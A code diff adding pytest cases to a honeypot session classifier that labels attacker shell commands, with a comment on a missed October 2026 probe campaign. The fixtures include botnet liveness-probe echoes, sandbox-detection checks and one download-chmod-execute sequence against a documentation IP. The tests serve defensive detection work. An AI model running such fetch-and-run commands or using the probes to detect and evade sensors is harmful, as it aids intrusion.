@@ -444,3 +444,77 @@ def test_running_a_fetched_script_is_payload_execution() -> None:
 
 def test_changing_directory_once_is_not_hunting_for_anything() -> None:
     assert Behaviour.WRITABLE_DIR_HUNT not in classify(facts("cd /tmp")).behaviours
+
+
+# --- The campaign of 20 October 2026 ---------------------------------------
+#
+# 2,555 sessions in one day, every one a single command, none of them matched.
+# The rules were not missing a category: `MARKER_ECHO` required three or more
+# hex escapes, written around the markers then in the corpus — `GAYFGT` is six
+# bytes, `auth_ok` eight — and this probe spells `ok` in two. They missed by
+# one character of regex.
+
+
+@pytest.mark.parametrize(
+    ("command", "why"),
+    [
+        ('echo -e "\\x6F\\x6B"', "two hex bytes spelling ok"),
+        ('echo -e "\\x47\\x41\\x59\\x46\\x47\\x54"', "GAYFGT, the Gafgyt marker"),
+        ('echo -e "\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A"', "auth_ok"),
+        ("echo TELNET_TEST_OK", "the same probe without the obfuscation"),
+        ("echo S_CHECK", "plain marker"),
+        ("echo SHELL_TEST", "plain marker"),
+        ("echo INFECT_CHECK", "plain marker"),
+        ("echo xsec", "a scanner that signs its work"),
+    ],
+)
+def test_a_liveness_probe_is_shell_probing(command: str, why: str) -> None:
+    label = classify(SessionFacts(session_id="s", commands=(command,)))
+    assert Behaviour.MARKER_ECHO in label.behaviours, why
+    assert label.intent is Intent.SHELL_PROBING
+
+
+def test_two_hex_bytes_are_enough_to_be_a_marker() -> None:
+    """The exact boundary the campaign walked through."""
+    assert classify(SessionFacts(session_id="s", commands=('echo -e "\\x6F\\x6B"',))).intent is (
+        Intent.SHELL_PROBING
+    )
+
+
+def test_arithmetic_expansion_is_a_sandbox_check() -> None:
+    """A real shell prints the sum. An emulator that does not implement
+    `$(( ))` prints the expression or an error, which is the tell the probe
+    is looking for — and this sensor fails it."""
+    label = classify(SessionFacts(session_id="s", commands=("echo READY_$((41+1))",)))
+    assert Behaviour.SANDBOX_CHECK in label.behaviours
+    assert label.intent is Intent.SHELL_PROBING
+
+
+def test_asking_about_docker_is_a_sandbox_check() -> None:
+    label = classify(SessionFacts(session_id="s", commands=("docker ps",)))
+    assert Behaviour.SANDBOX_CHECK in label.behaviours
+
+
+def test_listing_processes_alone_still_gets_an_intent() -> None:
+    """`ps` carried no intent because it happens at every stage — but intent
+    is the furthest point reached, so a low rank never lowers a session that
+    went further. Carrying none meant a session whose only command was `ps aux`
+    had no intent at all and fell to `other`."""
+    label = classify(SessionFacts(session_id="s", commands=("ps aux | head -10",)))
+    assert label.intent is Intent.FINGERPRINTING
+
+
+def test_process_enumeration_does_not_lower_a_session_that_went_further() -> None:
+    label = classify(
+        SessionFacts(
+            session_id="s",
+            commands=("ps aux", "cd /tmp", "wget http://198.51.100.9/x", "chmod 777 x", "./x"),
+        )
+    )
+    assert label.intent is Intent.STAGING
+
+
+def test_an_ordinary_echo_is_not_a_marker() -> None:
+    """The marker pattern matches shouted tokens, not every use of echo."""
+    label = classify(SessionFacts(session_id="s", commands=("echo hello world",)))
+    assert Behaviour.MARKER_ECHO not in label.behaviours
